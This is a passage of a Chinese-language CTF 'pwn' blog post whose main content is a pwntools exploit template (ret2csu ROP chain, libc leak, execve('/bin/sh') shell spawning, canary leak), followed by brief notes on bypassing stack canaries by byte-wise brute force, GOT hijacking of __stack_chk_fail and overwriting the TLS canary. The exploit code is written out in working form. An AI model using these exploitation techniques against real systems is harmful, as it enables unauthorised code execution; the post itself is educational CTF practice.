<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">arch</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">,</span> <span class="s">'sh'</span><span class="p">,</span> <span class="s">'-c'</span><span class="p">]</span>

<span class="n">index</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>

<span class="k">if</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
	<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">vul</span><span class="p">)</span>

<span class="k">elif</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
    <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">vul</span><span class="p">,</span> <span class="s">'''
break _start
continue

b main
'''</span><span class="p">)</span>
    <span class="n">pause</span><span class="p">()</span>

<span class="k">elif</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">2</span><span class="p">:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
	<span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">libc</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">vul</span><span class="p">)</span>
	<span class="c1">#gdb.attach(proc.pidof(s)[0])
</span>	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"b main"</span><span class="p">)</span>
	<span class="n">pause</span><span class="p">()</span>

<span class="k">elif</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
	<span class="n">lib</span> <span class="o">=</span> <span class="s">'~/work/ctf/2019/tamuctf/pwn/3/libc.so.6'</span>
	<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">lib</span><span class="p">)</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">vul</span><span class="p">,</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s">'LD_PRELOAD'</span><span class="p">:</span> <span class="n">lib</span><span class="p">})</span>
	
	<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">"b * 0x40080b"</span><span class="p">)</span>
	<span class="n">pause</span><span class="p">()</span>

<span class="k">elif</span> <span class="n">index</span> <span class="o">==</span> <span class="mi">4</span><span class="p">:</span>
	<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'debug'</span>
	<span class="n">ip</span> <span class="o">=</span> <span class="s">'pwn.jarvisoj.com'</span> 
	<span class="n">port</span> <span class="o">=</span> <span class="mi">1234</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    
<span class="k">else</span><span class="p">:</span>
	<span class="k">print</span> <span class="s">'wrong'</span>


<span class="k">def</span> <span class="nf">libSearch</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">fname</span> <span class="o">=</span> <span class="s">'write'</span><span class="p">):</span>
	<span class="n">obj</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="n">fname</span><span class="p">,</span> <span class="n">addr</span><span class="p">)</span>
	<span class="c1">#obj.db = 'libc6_2.23-0ubuntu10_i386.symbols'
</span>	<span class="n">libc_base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="n">fname</span><span class="p">)</span>
	<span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'system'</span><span class="p">)</span>
	<span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'str_bin_sh'</span><span class="p">)</span>
	<span class="n">execve_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">obj</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s">'execve'</span><span class="p">)</span>
	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>


<span class="s">'''
d = DynELF(leak, elf = ELF(argv[1]))
system_addr = d.lookup('system', 'libc')
success("system_addr -&gt; {:#x}".format(system_addr))
'''</span>
<span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">4</span><span class="p">):</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'write'</span><span class="p">])</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">length</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"</span><span class="si">%#</span><span class="s">x =&gt; </span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="p">(</span><span class="n">data</span> <span class="ow">or</span> <span class="s">''</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)))</span>
    <span class="k">return</span> <span class="n">data</span>


<span class="k">def</span> <span class="nf">csu</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">r12</span><span class="p">,</span> <span class="n">r15</span><span class="p">,</span> <span class="n">r14</span><span class="p">,</span> <span class="n">r13</span><span class="p">,</span> <span class="n">ret</span><span class="p">,</span> <span class="n">rbx</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">rbp</span> <span class="o">=</span> <span class="mi">1</span><span class="p">):</span>
    <span class="c1"># pop rbx,rbp,r12,r13,r14,r15
</span>    <span class="c1"># rbx = 0,
</span>    <span class="c1"># rbp = 1
</span>    <span class="c1"># call r12
</span>    <span class="c1"># rdi = edi = r15d
</span>    <span class="c1"># rsi = r14
</span>    <span class="c1"># rdx = r13
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_second_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbx</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r12</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r13</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r14</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">r15</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">csu_first_addr</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mh">0x38</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span>
    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">csu_make</span><span class="p">():</span>
	<span class="n">csu_first_addr</span> <span class="o">=</span> <span class="mh">0x4005F0</span>
	<span class="n">csu_second_addr</span> <span class="o">=</span> <span class="mh">0x40060A</span>
	<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x40057D</span>
	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
	<span class="c1"># write(1,got['write'],8)
</span>	<span class="n">csu</span><span class="p">(</span><span class="mi">136</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="mi">1</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'write'</span><span class="p">],</span> <span class="mi">8</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
	<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'write'</span><span class="p">]</span>
	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc.address -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>

	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
	<span class="c1"># read(0,bss,16)
</span>	<span class="c1"># read execve_addr and /bin/sh\x00
</span>	<span class="n">csu</span><span class="p">(</span><span class="mi">136</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'read'</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(),</span> <span class="mi">16</span><span class="p">,</span> <span class="n">main_addr</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'execve'</span><span class="p">])</span> <span class="o">+</span> <span class="s">'/bin/sh</span><span class="se">\x00</span><span class="s">'</span><span class="p">)</span>

	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
	<span class="c1"># execve('/bin/sh', 0, 0)
</span>	<span class="n">csu</span><span class="p">(</span><span class="mi">136</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">(),</span> <span class="n">elf</span><span class="o">.</span><span class="n">bss</span><span class="p">()</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>
	<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">def</span> <span class="nf">exception_canary</span><span class="p">():</span>
	<span class="n">environ_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'environ'</span><span class="p">]</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x128</span><span class="p">),</span> <span class="n">environ_addr</span><span class="p">])</span>
	<span class="n">stack_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
	<span class="n">success</span><span class="p">(</span><span class="s">"stack_address -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">stack_address</span><span class="p">))</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="n">cyclic</span><span class="p">(</span><span class="mh">0x128</span><span class="p">),</span> <span class="n">stack_address</span> <span class="o">-</span> <span class="mh">0x168</span><span class="p">])</span>

	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s">'1'</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">],</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s">'puts'</span><span class="p">],</span> <span class="n">vuln_addr</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span> <span class="s">'a'</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span><span class="n">fake_rbp</span><span class="p">,</span> <span class="n">leave_ret_addr</span><span class="p">])</span>
	<span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'</span><span class="se">\x7f</span><span class="s">'</span><span class="p">)[</span><span class="o">-</span><span class="mi">6</span><span class="p">:]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'setvbuf'</span><span class="p">]</span>

	<span class="n">rdx_rsi_ret</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x1150c9</span>
	<span class="n">sh_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>
	<span class="n">execve_addr</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'execve'</span><span class="p">]</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span><span class="s">'2'</span> <span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="n">rdi_ret</span><span class="p">,</span> <span class="n">sh_addr</span><span class="p">,</span> <span class="n">rdx_rsi_ret</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">execve_addr</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">80</span><span class="p">,</span><span class="s">'b'</span><span class="p">)</span>
	<span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">([</span><span class="n">fake_rbp</span> <span class="o">-</span> <span class="mh">0x30</span><span class="p">,</span> <span class="n">leave_ret_addr</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
	<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"</span><span class="se">\x0a</span><span class="s">"</span><span class="p">)</span>
	<span class="n">canary</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
	<span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"canary -&gt; {:#x}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
	
	<span class="n">getshell</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s">"getshell"</span><span class="p">]</span>
	
	<span class="n">s</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">cyclic</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">12</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">getshell</span><span class="p">))</span>
	<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
	<span class="n">s</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
	

<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">'__main__'</span><span class="p">:</span>
	<span class="n">main</span><span class="p">()</span>
	
</code></pre></div></div>

<h1 id="爆破canary">爆破canary</h1>

<h2 id="one-by-one">one-by-one</h2>

<p>对于 Canary，不仅每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，而且同一个进程中的每个线程的 Canary 也不同。 但是存在一类通过 fork 函数开启子进程交互的题目，因为 fork 函数会直接拷贝父进程的内存，因此每次创建的子进程的 Canary 是相同的。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">print</span> <span class="s">"[+] Brute forcing stack canary "</span>

<span class="n">start</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
<span class="n">stop</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span>

<span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">stop</span><span class="p">:</span>
   <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
      <span class="n">res</span> <span class="o">=</span> <span class="n">send2server</span><span class="p">(</span><span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span>

      <span class="k">if</span> <span class="n">res</span> <span class="o">!=</span> <span class="s">""</span><span class="p">:</span>
         <span class="n">p</span> <span class="o">=</span> <span class="n">p</span> <span class="o">+</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
         <span class="c1">#print "\t[+] Byte found 0x%02x" % i
</span>         <span class="k">break</span>

      <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">255</span><span class="p">:</span>
         <span class="k">print</span> <span class="s">"[-] Exploit failed"</span>
         <span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span>

<span class="n">canary</span> <span class="o">=</span> <span class="n">p</span><span class="p">[</span><span class="n">stop</span><span class="p">:</span><span class="n">start</span><span class="o">-</span><span class="mi">1</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"hex"</span><span class="p">)</span>
<span class="k">print</span> <span class="s">"   [+] SSP value is 0x</span><span class="si">%</span><span class="s">s"</span> <span class="o">%</span> <span class="n">canary</span>
</code></pre></div></div>

<h2 id="劫持__stack_chk_fail-函数">劫持__stack_chk_fail 函数</h2>

<p>已知 Canary 失败的处理逻辑会进入到 <code class="highlighter-rouge">__stack_chk_fail</code>ed 函数，<code class="highlighter-rouge">__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p>

<h2 id="覆盖-tls-中储存的-canary-值">覆盖 TLS 中储存的 Canary 值</h2>

<p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p>

<p><img src="/img/2019-03/Snipaste_2019-03-01_09-30-43.png" alt="Snipaste_2019-03-01_09-30-43" /></p>


        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fa fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#pwn" class="page__taxonomy-item" rel="tag">pwn</a>
    
    </span>
  </p>




        
          <p class="page__date"><strong><i class="fa fa-calendar" aria-hidden="true"></i> Updated:</strong> <time datetime="2019-03-01T03:49:00+08:00">March 01, 2019</time></p>
        
      </footer>

      <section class="page__share">
  
    <h4 class="page__share-title">Share on</h4>
  

  <a href="https://twitter.com/intent/tweet?via=zjgcjy&text=Pwnit+1%20https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fa fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>

  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fa fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>

  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fzjgcjy.github.io%2Fposts%2F2019-03%2FPwnit-1.html" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fa fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
</section>


      
  <nav class="pagination">
    
      <a href="/posts/2019-01/AngrLearning-9.html" class="pagination--pager" title="Angrlearning 9
">Previous</a>
    
    
      <a href="/posts/2019-03/Pwnit-2.html" class="pagination--pager" title="Pwnit 2
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
  
    <div class="page__related">
      <h4 class="page__related-title">You may also enjoy</h4>
      <div class="grid__wrapper">
        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-11/Dirary_November.html" rel="permalink">Dirary_november
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  每日所作所得




11月1日
</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/Software_Security_Project.html" rel="permalink">Software_security_project
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  Malware
vs2010




InfoCollection

configure



warning



</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/Pacman_Helper.html" rel="permalink">Pacman_helper
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  2 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  pacman 手册




archlinux pacman 命令
arch wiki

pacman -Sy 仅同步源

pacman -Syu 同步源，并更新系统

pacman -Su –ignore foo 升级时不升级包foo

pacman -S abc 从本地数据库中得到abc的信息，下载安装...</p>
  </article>
</div>

        
          



<div class="grid__item">
  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
    
    <h2 class="archive__item-title" itemprop="headline">
      
        <a href="/posts/2019-10/%E5%8D%81%E6%9C%88%E6%97%A5%E8%AE%B0.html" rel="permalink">十月日记
</a>
      
    </h2>
    
      <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 




  less than 1 minute read

</p>
    
    <p class="archive__item-excerpt" itemprop="description">
  每日所作所得




10月1日

周日，上课前最后一天，算是给自己放了最后一天假期

10月2日

上了第一天的课，主要是os，一脸蒙蔽。
</p>
  </article>
</div>

        
      </div>
    </div>
  
  
</div>

    </div>

    
      <div class="search-content">
        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
    <label class="sr-only" for="search">
      Enter your search term...
    </label>
    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
  </form>
  <div id="results" class="results"></div></div>

      </div>
    

    <div id="footer" class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    
      <li><strong>Follow:</strong></li>
    

    
      
        
          <li><a href="https://github.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-github-square" aria-hidden="true"></i> GitHub</a></li>
        
      
        
          <li><a href="https://twitter.com/zjgcjy" rel="nofollow noopener noreferrer"><i class="fa fa-twitter-square" aria-hidden="true"></i> Twitter</a></li>
        
      
    

    <li><a href="/feed.xml"><i class="fa fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2019 Blogger. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script src="https://use.fontawesome.com/1d25d6ba93.js"></script>




<script src="/assets/js/lunr/lunr.min.js"></script>
<script src="/assets/js/lunr/lunr-store.js"></script>
<script src="/assets/js/lunr/lunr-en.js"></script>




    
  <div id="disqus_thread"></div>
  <script>
    /**
*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
    */
    /*
    var disqus_config = function () {
      this.page.url = "https://zjgcjy.github.io/posts/2019-03/Pwnit-1.html";  // Replace PAGE_URL with your page's canonical URL variable
      this.page.identifier = "/posts/2019-03/Pwnit-1"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */
    (function() { // DON'T EDIT BELOW THIS LINE
      var d = document, s = d.createElement('script');
      s.src = 'https://zjgcjy-github-io.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  </script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>


  





  </body>
</html>
